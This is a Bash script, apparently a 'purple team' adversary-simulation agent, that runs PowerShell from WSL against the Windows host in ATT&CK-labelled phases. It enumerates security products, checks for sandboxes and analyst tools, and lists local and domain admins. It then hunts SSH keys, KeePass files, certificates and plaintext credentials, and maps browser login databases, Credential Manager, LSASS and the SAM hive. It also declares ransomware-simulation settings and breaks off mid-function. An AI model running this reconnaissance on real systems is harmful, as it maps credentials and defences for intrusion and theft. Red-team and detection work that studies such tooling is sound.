#!/bin/bash

################################################################################
# Purple Team Agent - WSL to Windows Host
# Version: 4.0
# Description: Advanced adversary simulation for purple team exercises
#              targeting financial and government sector TTPs
# Usage: ./agent.sh [options]
################################################################################

set -o pipefail

# ============================================================================
# CONFIGURATION
# ============================================================================

readonly SCRIPT_VERSION="4.2"
readonly WINDOWS_SYSTEM="/mnt/c"
readonly TIMEOUT_SECONDS=30

# Ransomware simulation directory and encryption key
readonly RANSOM_SIM_DIR="/tmp/purpleteam_ransom_sim"
readonly RANSOM_KEY="PurpleTeam_Decrypt_Key_2024!"
readonly RANSOM_EXT=".locked"
readonly RANSOM_MANIFEST="${RANSOM_SIM_DIR}/.manifest"

# Log paths are set once at startup; declare here, assign in init_logs
LOG_FILE=""
JSON_LOG=""

# Terminal color codes
readonly C_RED='\033[0;31m'
readonly C_GREEN='\033[0;32m'
readonly C_YELLOW='\033[1;33m'
readonly C_BLUE='\033[0;34m'
readonly C_MAGENTA='\033[0;35m'
readonly C_CYAN='\033[0;36m'
readonly C_WHITE='\033[1;37m'
readonly C_GRAY='\033[0;90m'
readonly C_BOLD='\033[1m'
readonly C_DIM='\033[2m'
readonly C_RESET='\033[0m'

# Box-drawing characters for structured output
readonly B_TL="┌" B_TR="┐" B_BL="└" B_BR="┘"
readonly B_H="─" B_V="│" B_VR="├" B_VL="┤"

# Track execution statistics
TOTAL_ACTIONS=0
SUCCESSFUL_ACTIONS=0
FAILED_ACTIONS=0
SKIPPED_ACTIONS=0
START_TIME=$(date +%s)
CURRENT_PHASE=""
CURRENT_PHASE_START=0
PHASE_FINDINGS=()

# Environment detection results
WSL_VERSION=""
POWERSHELL_CMD=""
HOSTNAME_DETECTED=""
USERNAME_DETECTED=""

# ============================================================================
# LOGGING SYSTEM
# ============================================================================

init_logs() {
    local ts
    ts=$(date +%Y%m%d_%H%M%S)
    LOG_FILE="/tmp/purpleteam_${ts}.log"
    JSON_LOG="/tmp/purpleteam_${ts}.json"

    {
        printf '%s\n' "╔═══════════════════════════════════════════════════════════════════════╗"
        printf '%s\n' "║               PURPLE TEAM AGENT v${SCRIPT_VERSION} — EXECUTION LOG                  ║"
        printf '%s\n' "╚═══════════════════════════════════════════════════════════════════════╝"
        printf '\n'
        printf '  %-18s %s\n' "Start Time:" "$(date '+%Y-%m-%d %H:%M:%S %Z')"
        printf '  %-18s %s\n' "Operator:" "$(whoami)"
        printf '  %-18s %s\n' "Hostname:" "$(hostname)"
        printf '  %-18s %s\n' "Log File:" "$LOG_FILE"
        printf '  %-18s %s\n' "JSON Log:" "$JSON_LOG"
        printf '\n'
    } > "$LOG_FILE"

    printf '[\n' > "$JSON_LOG"
}

log_text() {
    local indent="$1"
    shift
    printf '%*s%s\n' "$indent" "" "$*" >> "$LOG_FILE"
}

log_json_event() {
    local status="$1" technique="$2" phase="$3" description="$4" detail="$5"
    local ts
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ")
    local elapsed=$(($(date +%s) - START_TIME))

    cat >> "$JSON_LOG" <<JSONEOF
  {
    "timestamp": "$ts",
    "elapsed_seconds": $elapsed,
    "phase": "$phase",
    "status": "$status",
    "technique": "$technique",
    "description": $(printf '%s' "$description" | sed 's/\\/\\\\/g;s/"/\\"/g' | sed 's/.*/  "&"/'),
    "detail": $(printf '%s' "${detail:-}" | sed 's/\\/\\\\/g;s/"/\\"/g' | sed 's/.*/  "&"/')
  },
JSONEOF
}

# ============================================================================
# TERMINAL OUTPUT FUNCTIONS
# Every line shows wall-clock time + elapsed seconds for easy correlation
# ============================================================================

_ts() { date '+%H:%M:%S'; }
_elapsed() { printf '+%ds' "$(( $(date +%s) - START_TIME ))"; }
_log_ts() { date '+%Y-%m-%d %H:%M:%S'; }

print_success() {
    local message="$1"
    local technique="${2:-}"
    printf '%b%s %s %b[✓]%b %b%s%b\n' "$C_DIM" "$(_ts)" "$(_elapsed)" "$C_GREEN" "$C_RESET" "$C_WHITE" "$message" "$C_RESET"
    log_text 4 "$(_log_ts) [SUCCESS] $message"
    log_json_event "SUCCESS" "$technique" "$CURRENT_PHASE" "$message"
    ((SUCCESSFUL_ACTIONS++))
}

print_error() {
    local message="$1"
    local technique="${2:-}"
    printf '%b%s %s %b[✗]%b %b%s%b\n' "$C_DIM" "$(_ts)" "$(_elapsed)" "$C_RED" "$C_RESET" "$C_RED" "$message" "$C_RESET"
    log_text 4 "$(_log_ts) [FAILED]  $message"
    log_json_event "FAILED" "$technique" "$CURRENT_PHASE" "$message"
    ((FAILED_ACTIONS++))
}

print_warning() {
    local message="$1"
    local technique="${2:-}"
    printf '%b%s %s %b[!]%b %b%s%b\n' "$C_DIM" "$(_ts)" "$(_elapsed)" "$C_YELLOW" "$C_RESET" "$C_YELLOW" "$message" "$C_RESET"
    log_text 4 "$(_log_ts) [WARNING] $message"
}

print_info() {
    local message="$1"
    printf '%b%s %s %b[i]%b %b%s%b\n' "$C_DIM" "$(_ts)" "$(_elapsed)" "$C_BLUE" "$C_RESET" "$C_GRAY" "$message" "$C_RESET"
    log_text 4 "$(_log_ts) [INFO]    $message"
}

print_action() {
    local message="$1"
    printf '%b%s %s %b[>]%b %b%s%b\n' "$C_DIM" "$(_ts)" "$(_elapsed)" "$C_MAGENTA" "$C_RESET" "$C_MAGENTA" "$message" "$C_RESET"
    log_text 4 "$(_log_ts) [ACTION]  $message"
}

print_detail() {
    local message="$1"
    printf '              %b%s%b\n' "$C_DIM" "$message" "$C_RESET"
    log_text 8 "$message"
}

print_finding() {
    local severity="$1" message="$2"
    local color="$C_WHITE"
    case "$severity" in
        HIGH)     color="$C_RED" ;;
        MEDIUM)   color="$C_YELLOW" ;;
        LOW)      color="$C_CYAN" ;;
        INFO)     color="$C_GRAY" ;;
    esac
    printf '              %b[%s]%b %s\n' "$color" "$severity" "$C_RESET" "$message"
    log_text 8 "$(_log_ts) [FINDING:$severity] $message"
    PHASE_FINDINGS+=("[$severity] $message")
}

# Phase section header with wall-clock start time and technique mapping
begin_phase() {
    local number="$1" title="$2" techniques="$3" description="$4"
    CURRENT_PHASE="Phase $number"
    CURRENT_PHASE_START=$(date +%s)
    PHASE_FINDINGS=()

    local now
    now=$(date '+%Y-%m-%d %H:%M:%S')

    printf '\n'
    printf '%b╔══════════════════════════════════════════════════════════════════════╗%b\n' "$C_CYAN" "$C_RESET"
    printf '%b║%b  %bPHASE %s: %s%b\n' "$C_CYAN" "$C_RESET" "$C_BOLD" "$number" "$title" "$C_RESET"
    printf '%b║%b  %bMITRE ATT&CK: %s%b\n' "$C_CYAN" "$C_RESET" "$C_GRAY" "$techniques" "$C_RESET"
    printf '%b║%b  %b%s%b\n' "$C_CYAN" "$C_RESET" "$C_DIM" "$description" "$C_RESET"
    printf '%b║%b  %bStarted: %s   (elapsed: %s)%b\n' "$C_CYAN" "$C_RESET" "$C_DIM" "$now" "$(_elapsed)" "$C_RESET"
    printf '%b╚══════════════════════════════════════════════════════════════════════╝%b\n' "$C_CYAN" "$C_RESET"
    printf '\n'

    {
        printf '\n'
        printf '  ══════════════════════════════════════════════════════════════════\n'
        printf '  PHASE %s: %s\n' "$number" "$title"
        printf '  Techniques: %s\n' "$techniques"
        printf '  Started:    %s  (total elapsed: %s)\n' "$now" "$(_elapsed)"
        printf '  ──────────────────────────────────────────────────────────────────\n'
        printf '\n'
    } >> "$LOG_FILE"
}

end_phase() {
    local phase_end phase_duration
    phase_end=$(date +%s)
    phase_duration=$(( phase_end - CURRENT_PHASE_START ))
    local end_wall
    end_wall=$(date '+%Y-%m-%d %H:%M:%S')

    if [ ${#PHASE_FINDINGS[@]} -gt 0 ]; then
        printf '\n'
        printf '  %b── Findings (%d) ──%b\n' "$C_WHITE" "${#PHASE_FINDINGS[@]}" "$C_RESET"
        for f in "${PHASE_FINDINGS[@]}"; do
            printf '  %s\n' "$f"
        done
    fi

    printf '\n  %b%s completed at %s  (%ds elapsed, total %s)%b\n' \
        "$C_DIM" "$CURRENT_PHASE" "$end_wall" "$phase_duration" "$(_elapsed)" "$C_RESET"

    {
        printf '\n'
        printf '  ── Phase Findings (%d) ──\n' "${#PHASE_FINDINGS[@]}"
        for f in "${PHASE_FINDINGS[@]}"; do
            printf '    %s\n' "$f"
        done
        printf '  Finished:  %s\n' "$end_wall"
        printf '  Duration:  %ds  (total elapsed: %s)\n' "$phase_duration" "$(_elapsed)"
        printf '  ──────────────────────────────────────────────────────────────────\n'
    } >> "$LOG_FILE"
}

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

safe_find() {
    local path="$1" pattern="$2" max_results="${3:-20}"
    [ ! -d "$path" ] && return 1
    timeout 10 find "$path" -type f -name "$pattern" 2>/dev/null | head -n "$max_results"
}

safe_grep() {
    local pattern="$1" path="$2" max_results="${3:-10}"
    [ ! -d "$path" ] && return 1
    timeout 10 grep -r -i -l "$pattern" "$path" 2>/dev/null | head -n "$max_results"
}

# ============================================================================
# POWERSHELL EXECUTION WRAPPER
# ============================================================================

execute_ps() {
    local command="$1"
    local technique="$2"
    local description="$3"

    ((TOTAL_ACTIONS++))
    print_action "$description"

    local temp_out temp_err exit_code
    temp_out=$(mktemp)
    temp_err=$(mktemp)
    exit_code=0

    if timeout $TIMEOUT_SECONDS $POWERSHELL_CMD -NoProfile -NonInteractive -Command "$command" > "$temp_out" 2> "$temp_err"; then
        exit_code=0
    else
        exit_code=$?
    fi

    if [ $exit_code -eq 0 ] && [ -s "$temp_out" ]; then
        print_success "$description" "$technique"

        {
            printf '    %s %s\n' "$B_TL$B_H" "$description"
            printf '    %s  Technique: %s | Status: SUCCESS | Time: %s\n' "$B_V" "$technique" "$(_log_ts)"
            printf '    %s\n' "$B_V"
            sed 's/^/    │  /' "$temp_out"
            printf '    %s\n' "$B_BL$B_H"
            printf '\n'
        } >> "$LOG_FILE"

        local line_count
        line_count=$(wc -l < "$temp_out")
        if [ "$line_count" -le 8 ]; then
            while IFS= read -r line; do
                print_detail "$line"
            done < "$temp_out"
        else
            head -6 "$temp_out" | while IFS= read -r line; do
                print_detail "$line"
            done
            print_detail "... ($line_count lines total, see log for full output)"
        fi

        rm -f "$temp_out" "$temp_err"
        return 0
    else
        local error_msg="Failed"
        [ -s "$temp_err" ] && error_msg=$(head -1 "$temp_err")
        [ $exit_code -eq 124 ] && error_msg="Timeout (${TIMEOUT_SECONDS}s)"

        print_error "$description — $error_msg" "$technique"

        {
            printf '    %s %s\n' "$B_TL$B_H" "$description"
            printf '    %s  Technique: %s | Status: FAILED | Time: %s\n' "$B_V" "$technique" "$(_log_ts)"
            printf '    %s  Error: %s\n' "$B_V" "$error_msg"
            printf '    %s\n' "$B_BL$B_H"
            printf '\n'
        } >> "$LOG_FILE"

        rm -f "$temp_out" "$temp_err"
        return 1
    fi
}

# ============================================================================
# ENVIRONMENT DETECTION
# ============================================================================

detect_environment() {
    begin_phase "0" "Environment Detection" "T1082" \
        "Verify WSL runtime, Windows filesystem access, and PowerShell availability"

    if grep -qi microsoft /proc/version 2>/dev/null; then
        if grep -qi "WSL2" /proc/version 2>/dev/null; then
            WSL_VERSION="WSL2"
        else
            WSL_VERSION="WSL1"
        fi
        print_success "Running on $WSL_VERSION" "T1082"
    else
        print_error "Not running in WSL environment" "T1082"
        exit 1
    fi

    if [ ! -d "$WINDOWS_SYSTEM" ]; then
        print_warning "Standard mount /mnt/c not found, searching..."
        for mount in /mnt/*; do
            if [ -d "$mount/Windows" ]; then
                WINDOWS_SYSTEM="$mount"
                print_info "Found Windows at: $WINDOWS_SYSTEM"
                break
            fi
        done
        if [ ! -d "$WINDOWS_SYSTEM/Windows" ]; then
            print_error "Cannot locate Windows filesystem" "T1082"
            exit 1
        fi
    fi
    print_success "Windows filesystem accessible: $WINDOWS_SYSTEM" "T1082"

    if command -v powershell.exe &> /dev/null; then
        POWERSHELL_CMD="powershell.exe"
        print_success "PowerShell (Desktop) detected" "T1082"
    elif command -v pwsh.exe &> /dev/null; then
        POWERSHELL_CMD="pwsh.exe"
        print_success "PowerShell Core detected" "T1082"
    else
        print_error "No PowerShell executable found" "T1082"
        exit 1
    fi

    if ! timeout $TIMEOUT_SECONDS $POWERSHELL_CMD -NoProfile -Command "Write-Output 'test'" &> /dev/null; then
        print_error "PowerShell execution test failed" "T1082"
        exit 1
    fi
    print_success "PowerShell execution verified" "T1082"

    HOSTNAME_DETECTED=$($POWERSHELL_CMD -NoProfile -Command "hostname" 2>/dev/null | tr -d '\r')
    USERNAME_DETECTED=$($POWERSHELL_CMD -NoProfile -Command '[System.Environment]::UserName' 2>/dev/null | tr -d '\r')
    print_info "Target: ${USERNAME_DETECTED:-unknown}@${HOSTNAME_DETECTED:-unknown}"

    end_phase
}

# ============================================================================
# PHASE 1: SYSTEM & ENVIRONMENT PROFILING
# APT fingerprinting: OS details, virtualisation, security stack, locale
# ============================================================================

phase_system_discovery() {
    begin_phase 1 "System & Environment Profiling" \
        "T1082, T1497.001, T1614, T1614.001" \
        "Fingerprint the target: OS, hardware, virtualisation, language, security stack"

    execute_ps \
        "[System.Environment]::OSVersion | Format-List; Get-ComputerInfo | Select-Object CsName,WindowsVersion,WindowsBuildLabEx,OsArchitecture,OsTotalVisibleMemorySize,OsLanguage,TimeZone | Format-List" \
        "T1082" \
        "Collecting OS version, architecture, language, and timezone"

    execute_ps \
        "Get-HotFix | Sort-Object -Property InstalledOn -Descending -ErrorAction SilentlyContinue | Select-Object -First 15 HotFixID,Description,InstalledOn | Format-Table -AutoSize" \
        "T1082" \
        "Enumerating recent security patches"

    execute_ps \
        "(Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime | Select-Object Days,Hours,Minutes | Format-List" \
        "T1082" \
        "Checking system uptime"

    execute_ps \
        "Get-WmiObject Win32_ComputerSystem | Select-Object Model,Manufacturer,HypervisorPresent,PartOfDomain,Domain | Format-List" \
        "T1497.001" \
        "Detecting virtualisation and domain membership"

    execute_ps \
        "Get-WmiObject Win32_BIOS | Select-Object SMBIOSBIOSVersion,Manufacturer,SerialNumber | Format-List" \
        "T1497.001" \
        "BIOS fingerprint (sandbox/VM indicator)"

    execute_ps \
        "Get-MpComputerStatus -ErrorAction SilentlyContinue | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled,NISEnabled,AntivirusSignatureLastUpdated | Format-List" \
        "T1518.001" \
        "Windows Defender status and signature age"

    execute_ps \
        "Get-Service | Where-Object {\$_.DisplayName -match 'Defender|CrowdStrike|Carbon Black|SentinelOne|Sophos|Symantec|McAfee|ESET|Kaspersky|Trend Micro|Palo Alto|Cylance|Elastic|Splunk|Sysmon'} | Select-Object Name,DisplayName,Status | Format-Table -AutoSize" \
        "T1518.001" \
        "Enumerating security products (EDR/AV/SIEM agents)"

    execute_ps \
        "Get-WinSystemLocale | Format-List; Get-Culture | Select-Object Name,DisplayName | Format-List; (Get-TimeZone).DisplayName" \
        "T1614.001" \
        "System locale and timezone (geopolitical targeting context)"

    execute_ps \
        "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -ErrorAction SilentlyContinue | Select-Object EnableLUA,ConsentPromptBehaviorAdmin,FilterAdministratorToken | Format-List" \
        "T1082" \
        "UAC configuration"

    # Installed .NET / PowerShell versions (execution framework)
    execute_ps \
        "Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full' -ErrorAction SilentlyContinue | Get-ItemProperty | Select-Object Version,Release | Format-List; \$PSVersionTable | Format-List" \
        "T1082" \
        ".NET and PowerShell version details"

    # BitLocker status
    execute_ps \
        "Get-BitLockerVolume -ErrorAction SilentlyContinue | Select-Object MountPoint,VolumeStatus,ProtectionStatus,EncryptionMethod | Format-Table" \
        "T1082" \
        "BitLocker encryption status"

    # Antivirus product enumeration via WMI
    execute_ps \
        "Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue | Select-Object displayName,productState,pathToSignedProductExe | Format-Table -AutoSize" \
        "T1518.001" \
        "Registered antivirus products (SecurityCenter2)"

    end_phase
}

# ============================================================================
# PHASE 2: ACCOUNT & PRIVILEGE DISCOVERY
# Domain-aware enumeration for lateral movement planning
# ============================================================================

phase_account_discovery() {
    begin_phase 2 "Account & Privilege Discovery" \
        "T1087.001, T1087.002, T1069.001, T1069.002, T1201, T1033" \
        "Enumerate local/domain accounts, groups, privileges, and password policy"

    execute_ps \
        "whoami /all" \
        "T1033" \
        "Current user identity, groups, and privileges"

    execute_ps \
        "Get-LocalUser | Select-Object Name,Enabled,LastLogon,PasswordLastSet,PasswordExpires,AccountExpires,Description | Format-Table -AutoSize" \
        "T1087.001" \
        "Enumerating local user accounts"

    execute_ps \
        "Get-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue | Select-Object Name,ObjectClass,PrincipalSource | Format-Table -AutoSize" \
        "T1069.001" \
        "Members of local Administrators group"

    execute_ps \
        "Get-LocalGroup | Select-Object Name,Description | Format-Table -AutoSize" \
        "T1069.001" \
        "Enumerating all local groups"

    execute_ps \
        "Get-LocalGroupMember -Group 'Remote Desktop Users' -ErrorAction SilentlyContinue | Select-Object Name,ObjectClass | Format-Table -AutoSize" \
        "T1069.001" \
        "Remote Desktop Users (lateral movement targets)"

    execute_ps \
        "net accounts 2>\$null" \
        "T1201" \
        "Local password policy (lockout threshold, min length, history)"

    execute_ps \
        "Get-WmiObject Win32_ComputerSystem | Select-Object PartOfDomain,Domain,DomainRole | Format-List" \
        "T1087.002" \
        "Domain membership and role"

    execute_ps \
        "try { \$searcher = [adsisearcher]'(&(objectCategory=person)(objectClass=user)(adminCount=1))'; \$searcher.FindAll() | ForEach-Object { \$_.Properties['samaccountname'] } | Select-Object -First 20 } catch { Write-Output 'Domain enumeration not available (workgroup or access denied)' }" \
        "T1087.002" \
        "Domain admin accounts (LDAP adminCount=1)"

    execute_ps \
        "try { nltest /dclist:\$env:USERDOMAIN 2>\$null } catch { Write-Output 'Domain controller enumeration not available' }" \
        "T1018" \
        "Domain controller enumeration"

    execute_ps \
        "Get-WmiObject Win32_LoggedOnUser -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Dependent | Select-Object -Property Name -Unique | Select-Object -First 10 | Format-Table" \
        "T1033" \
        "Currently logged-on users"

    execute_ps \
        "try { net accounts /domain 2>\$null } catch { Write-Output 'Domain password policy not available' }" \
        "T1201" \
        "Domain password policy"

    end_phase
}

# ============================================================================
# PHASE 3: PROCESS & SERVICE INTELLIGENCE
# Identify security tools, financial apps, and opportunities
# ============================================================================

phase_process_discovery() {
    begin_phase 3 "Process & Service Intelligence" \
        "T1057, T1007, T1518.001, T1497.001" \
        "Map running processes — security tools, financial applications, analysis tools"

    execute_ps \
        "Get-Process | Select-Object Name,Id,Path,Company,CPU,WorkingSet64 | Sort-Object CPU -Descending | Select-Object -First 30 | Format-Table -AutoSize" \
        "T1057" \
        "Top processes by CPU (anomaly baseline)"

    execute_ps \
        "Get-Process | Where-Object {\$_.Name -match 'MsMpEng|MsSense|SenseIR|SenseCncProxy|WinDefend|csfalcon|CSFalconService|CSFalconContainer|cb|CbDefense|RepMgr|SentinelAgent|SentinelOne|sophos|SAVService|hmpalert|SEP|ccSvcHst|SymCorpUI|mcshield|mfemms|ESET|ekrn|avp|kavfs|TMCCSvc|Traps|CortexXDR|CylanceSvc|elastic-agent|filebeat|winlogbeat|splunkd|ossec'} | Select-Object Name,Id,Path | Format-Table -AutoSize" \
        "T1518.001" \
        "Security software process enumeration (EDR/AV/SIEM)"

    execute_ps \
        "Get-Process | Where-Object {\$_.Name -match 'wireshark|procmon|procexp|x64dbg|x32dbg|ollydbg|ida|ghidra|fiddler|burp|charles|dnspy|pestudio|hxd|sysinternals'} | Select-Object Name,Id | Format-Table" \
        "T1497.001" \
        "Analysis/debugging tools detection (analyst watching?)"

    execute_ps \
        "Get-Process | Where-Object {\$_.Name -match 'outlook|teams|slack|zoom|skype|webex|firefox|chrome|msedge|iexplore|thunderbird'} | Select-Object Name,Id | Format-Table" \
        "T1057" \
        "Communication and browser processes"

    execute_ps \
        "Get-Process | Where-Object {\$_.Name -match 'sql|oracle|swift|bloomberg|reuters|trading|fidelity|schwab|citi|chase|sap|sage|quickbooks|dynamics|navision|workday|peoplesoft'} | Select-Object Name,Id,Path | Format-Table" \
        "T1057" \
        "Financial / ERP / trading application processes"

    execute_ps \
        "Get-Service | Where-Object {\$_.Status -eq 'Running'} | Select-Object Name,DisplayName,StartType | Sort-Object DisplayName | Format-Table -AutoSize" \
        "T1007" \
        "All running services"

    execute_ps \
        "Get-Service | Where-Object {\$_.DisplayName -match 'Defender|Firewall|Update|Sense|SmartScreen|DLP|Endpoint|Audit|Sysmon'} | Select-Object Name,DisplayName,Status,StartType | Format-Table -AutoSize" \
        "T1007" \
        "Security-relevant services status"

    # Loaded DLLs in key processes (injection indicators)
    execute_ps \
        "Get-Process explorer -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Modules -ErrorAction SilentlyContinue | Where-Object {\$_.FileName -notmatch 'Windows|System32|SysWOW64'} | Select-Object -First 10 FileName | Format-Table" \
        "T1055" \
        "Non-system DLLs in explorer.exe (injection check)"

    # Parent-child process tree
    execute_ps \
        "Get-CimInstance Win32_Process | Select-Object -First 30 ProcessId,ParentProcessId,Name,CommandLine | Format-Table -AutoSize -Wrap" \
        "T1057" \
        "Process tree with command lines (anomaly detection)"

    end_phase
}

# ============================================================================
# PHASE 4: FILE & DIRECTORY DISCOVERY
# Sensitive document hunting: financial data, keys, configs, databases
# ============================================================================

phase_file_discovery() {
    begin_phase 4 "Sensitive File & Directory Discovery" \
        "T1083, T1005, T1552.001" \
        "Hunt for financial documents, certificates, configs, credential files, databases"

    ((TOTAL_ACTIONS++))
    print_action "Searching user directories for sensitive documents..."

    local found_files=0
    local search_patterns=(
        "*.pdf" "*.doc" "*.docx" "*.xls" "*.xlsx" "*.pptx"
        "*.csv" "*.mdb" "*.accdb" "*.sqlite" "*.kdbx"
        "*.pfx" "*.p12" "*.pem" "*.cer" "*.key"
        "*.rdp" "*.ovpn" "*.conf" "*.config" "*.ini" "*.env"
    )
    local search_locations=(
        "$WINDOWS_SYSTEM/Users/*/Desktop"
        "$WINDOWS_SYSTEM/Users/*/Documents"
        "$WINDOWS_SYSTEM/Users/*/Downloads"
        "$WINDOWS_SYSTEM/Users/*/OneDrive"
    )

    {
        printf '    %s File Discovery Scan\n' "$B_TL$B_H"
        printf '    %s\n' "$B_V"
    } >> "$LOG_FILE"

    for location in "${search_locations[@]}"; do
        if [ -d "$location" ] 2>/dev/null; then
            for pattern in "${search_patterns[@]}"; do
                while IFS= read -r file; do
                    printf '    %s  [FOUND] %s\n' "$B_V" "$file" >> "$LOG_FILE"
                    ((found_files++))
                done < <(safe_find "$location" "$pattern" 10)
            done
        fi
    done

    {
        printf '    %s\n' "$B_V"
        printf '    %s  Total files found: %d\n' "$B_V" "$found_files"
        printf '    %s\n' "$B_BL$B_H"
        printf '\n'
    } >> "$LOG_FILE"

    if [ $found_files -gt 0 ]; then
        print_success "Found $found_files sensitive files across user directories" "T1083"
        print_finding "MEDIUM" "$found_files sensitive files accessible from WSL"
    else
        print_info "No accessible files found in user directories"
        ((FAILED_ACTIONS++))
    fi

    # SSH keys
    ((TOTAL_ACTIONS++))
    print_action "Hunting for SSH keys and config..."
    local ssh_found=0
    for ssh_dir in "$WINDOWS_SYSTEM/Users/"*/.ssh; do
        if [ -d "$ssh_dir" ]; then
            {
                printf '    %s SSH Directory: %s\n' "$B_TL$B_H" "$ssh_dir"
                ls -la "$ssh_dir" 2>/dev/null | sed "s/^/    $B_V  /"
                printf '    %s\n' "$B_BL$B_H"
            } >> "$LOG_FILE"
            ((ssh_found++))
        fi
    done
    if [ $ssh_found -gt 0 ]; then
        print_success "Found $ssh_found SSH directories" "T1552.004"
        print_finding "HIGH" "SSH key directories accessible — potential lateral movement keys"
    else
        print_info "No SSH directories found"
        ((FAILED_ACTIONS++))
    fi

    # KeePass / password manager databases
    ((TOTAL_ACTIONS++))
    print_action "Searching for password manager databases..."
    local kp_found=0
    while IFS= read -r f; do
        print_detail "Password DB: $f"
        ((kp_found++))
    done < <(safe_find "$WINDOWS_SYSTEM/Users" "*.kdbx" 5)
    if [ $kp_found -gt 0 ]; then
        print_success "Found $kp_found password manager databases" "T1555"
        print_finding "HIGH" "KeePass databases found — master password attack surface"
    else
        print_info "No password manager databases found"
        ((SKIPPED_ACTIONS++))
    fi

    # Certificate files
    execute_ps \
        "Get-ChildItem -Path C:\Users -Recurse -Include *.pfx,*.p12,*.pem,*.cer,*.key -ErrorAction SilentlyContinue | Select-Object -First 15 FullName,Length,LastWriteTime | Format-Table -AutoSize" \
        "T1552.004" \
        "Certificate and private key files"

    # RDP connection files
    execute_ps \
        "Get-ChildItem -Path C:\Users -Recurse -Include *.rdp -ErrorAction SilentlyContinue | Select-Object -First 10 FullName,LastWriteTime | Format-Table" \
        "T1083" \
        "RDP connection files (lateral movement targets)"

    # Recently accessed files
    execute_ps \
        "Get-ChildItem -Path 'C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent' -ErrorAction SilentlyContinue | Sort-Object LastWriteTime -Descending | Select-Object -First 15 Name,LastWriteTime | Format-Table" \
        "T1083" \
        "Recently accessed files (user activity profiling)"

    end_phase
}

# ============================================================================
# PHASE 5: CREDENTIAL ACCESS RECONNAISSANCE
# Map all credential stores and harvest paths without extraction
# ============================================================================

phase_credential_search() {
    begin_phase 5 "Credential Access Reconnaissance" \
        "T1552.001, T1555.003, T1555.004, T1003.001, T1552.006, T1555" \
        "Map credential stores: browsers, vault, LSASS, SAM, cached creds, cloud tokens"

    # Files containing credential keywords
    ((TOTAL_ACTIONS++))
    print_action "Scanning for plaintext credentials in user files..."
    local cred_keywords=("password" "passwd" "secret" "token" "api_key" "apikey" "connection_string" "jdbc:" "sqlplus")
    local found_creds=0

    {
        printf '    %s Credential Keyword Scan\n' "$B_TL$B_H"
        printf '    %s\n' "$B_V"
    } >> "$LOG_FILE"

    for keyword in "${cred_keywords[@]}"; do
        while IFS= read -r file; do
            printf '    %s  [%s] %s\n' "$B_V" "$keyword" "$file" >> "$LOG_FILE"
            ((found_creds++))
        done < <(safe_grep "$keyword" "$WINDOWS_SYSTEM/Users/*/Documents" 5)
        while IFS= read -r file; do
            printf '    %s  [%s] %s\n' "$B_V" "$keyword" "$file" >> "$LOG_FILE"
            ((found_creds++))
        done < <(safe_grep "$keyword" "$WINDOWS_SYSTEM/Users/*/Desktop" 3)
    done

    {
        printf '    %s\n' "$B_V"
        printf '    %s  Potential credential files: %d\n' "$B_V" "$found_creds"
        printf '    %s\n' "$B_BL$B_H"
    } >> "$LOG_FILE"

    if [ $found_creds -gt 0 ]; then
        print_success "Found $found_creds files containing credential keywords" "T1552.001"
        print_finding "HIGH" "$found_creds files with embedded credentials/tokens"
    else
        print_info "No plaintext credential files found"
        ((FAILED_ACTIONS++))
    fi

    # Browser credential stores
    execute_ps \
        "Get-ChildItem 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Login Data' -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | Format-Table; Get-ChildItem 'C:\Users\*\AppData\Local\Google\Chrome\User Data\Default\Cookies' -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | Format-Table" \
        "T1555.003" \
        "Chrome credential and cookie databases"

    execute_ps \
        "Get-ChildItem 'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\logins.json' -ErrorAction SilentlyContinue | Select-Object FullName,Length | Format-Table; Get-ChildItem 'C:\Users\*\AppData\Roaming\Mozilla\Firefox\Profiles\*\key*.db' -ErrorAction SilentlyContinue | Select-Object FullName | Format-Table" \
        "T1555.003" \
        "Firefox credential databases"

    execute_ps \
        "Get-ChildItem 'C:\Users\*\AppData\Local\Microsoft\Edge\User Data\Default\Login Data' -ErrorAction SilentlyContinue | Select-Object FullName,Length,LastWriteTime | Format-Table" \
        "T1555.003" \
        "Edge credential database"

    # Windows Credential Manager
    execute_ps \
        "cmdkey /list 2>\$null" \
        "T1555.004" \
        "Windows Credential Manager stored credentials"

    # PowerShell history
    execute_ps \
        "Get-ChildItem 'C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output ('History: ' + \$_.FullName + ' (Size: ' + \$_.Length + ')'); Get-Content \$_.FullName -Tail 30 -ErrorAction SilentlyContinue | Select-String -Pattern 'password|secret|token|key|credential|connect' -SimpleMatch }" \
        "T1552.001" \
        "PowerShell history — credential keywords"

    # LSASS accessibility check
    execute_ps \
        "Get-Process lsass -ErrorAction SilentlyContinue | Select-Object Id,HandleCount,WorkingSet64 | Format-List; \$lsass = Get-Process lsass -ErrorAction SilentlyContinue; if (\$lsass) { Write-Output \"LSASS PID: \$(\$lsass.Id) — credential extraction target\" }" \
        "T1003.001" \
        "LSASS process accessibility (credential dump target)"

    # SAM / SYSTEM hive accessibility
    execute_ps \
        "Test-Path 'C:\Windows\System32\config\SAM'; Test-Path 'C:\Windows\System32\config\SYSTEM'; icacls 'C:\Windows\System32\config\SAM' 2>\$null | Select-Object -First 5" \
        "T1003.002" \
        "SAM/SYSTEM hive accessibility"

    # Cached domain credentials
    execute_ps \
        "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -ErrorAction SilentlyContinue | Select-Object DefaultUserName,DefaultDomainName,AutoAdminLogon,CachedLogonsCount | Format-List" \
        "T1003.005" \
        "Cached logon credentials and auto-logon config"

    # Cloud credential files
    ((TOTAL_ACTIONS++))
